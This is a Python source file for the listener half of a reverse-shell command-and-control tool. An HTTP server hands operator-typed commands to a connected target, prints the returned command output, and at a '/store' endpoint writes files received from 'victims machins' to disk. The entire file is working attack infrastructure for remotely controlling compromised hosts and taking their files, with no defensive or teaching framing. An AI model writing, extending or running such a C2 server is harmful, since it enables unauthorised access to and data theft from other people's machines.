
import http.server
from os import system
import cgi
from cores.Configurations import DOWNLOADING_PATH
from cores.help_manager import help_man
from termcolor import colored
import getpass


# Connected-Shell terminal
SHELL_STATEMENT = f"F4T3H(IP)> "


class ServerHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        command = input(colored(SHELL_STATEMENT, "blue"))
        if "help" in command:
            help_man()
        else:
            print("[]")

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())
        if command == "end-session":
            # send it to the target machine
            pass

    def do_POST(self):
        if self.path == '/store':
            try:
                conyent_type, _ = cgi.parse_header(self.headers.get('content-type'))
                if conyent_type == 'multipart/form-data':
                    getting_file = cgi.FieldStorage(fp = self.rfile, headers = self.headers, environ= {'REQUEST_METHOD': 'POST'})
                else:
                    print(colored('[-] Unexpected POST request', 'red'))

                # Getting files from victims machins into yours.
                client_file = getting_file['file']
                file_content = client_file.file.read()
                # adding file name methode
                with open(f'{DOWNLOADING_PATH}/file.png', 'wb') as file_object:
                    print(colored('[+] Writing file ..', 'green'))
                    file_object.write(file_content)
                    self.send_response(200)
                    self.end_headers()
                # if the file was downloaded succ or not.
            except Exception as e:
                print(e)
            return
        # return html status code 200
        self.send_response(200)
        self.end_headers()
        # it return string by default so we will casting/converting it to integer
        length = int(self.headers['Content-length'])
        post_value = self.rfile.read(length).decode()
        # displaying command outputs.
        print(colored(f"\n{post_value}", "green"))


def HTTPHandler(host, port):
    server_class = http.server.HTTPServer
    server_address = (host, port)
    httpd = server_class(server_address, ServerHandler)
    system("clear")
    print(colored(f"[-] Starting HTTP server @ {server_address[0]}:{server_address[1]}", "green"))
    print(colored("[+] Wating for incomming connections. . .", "yellow"))
    httpd.serve_forever()
    system("clear")


# you can read more # https://docs.python.org/3/library/http.server.html